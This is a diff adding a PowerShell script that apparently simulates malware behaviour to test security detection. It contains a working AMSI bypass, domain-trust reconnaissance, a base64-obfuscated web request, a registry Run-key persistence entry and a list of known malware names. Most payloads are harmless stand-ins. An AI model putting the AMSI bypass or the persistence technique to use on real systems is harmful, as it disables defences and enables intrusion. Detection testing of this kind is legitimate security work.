@@ -1,0 +1,25 @@
+$ErrorActionPreference = 'SilentlyContinue'
+
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096)
+[System.Runtime.InteropServices.Marshal]::Copy((0x90,0x90,0x90,0x90), 0, $mem, 4)
+
+iex "nltest /domain_trusts" *> $env:temp\fake_creds.txt
+
+$c2 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9nb29nbGUuY29t"))
+irm $c2 -Headers @{"X-Malware"="1"}
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AV_Test" /t REG_SZ /d "powershell -w h -nop -c `"Write-Host 'Harmless'`"" /f
+
+whoami /priv > $env:temp\privs.txt
+
+$mal_strings = @(
+    "Mimikatz",
+    "CobaltStrike",
+    "WannaCry",
+    "Ryuk",
+    "EICAR-TEST-FILE"
+)
+
+Write-Output "Simulated malware behaviors complete" | Out-File "$env:temp\report.txt"
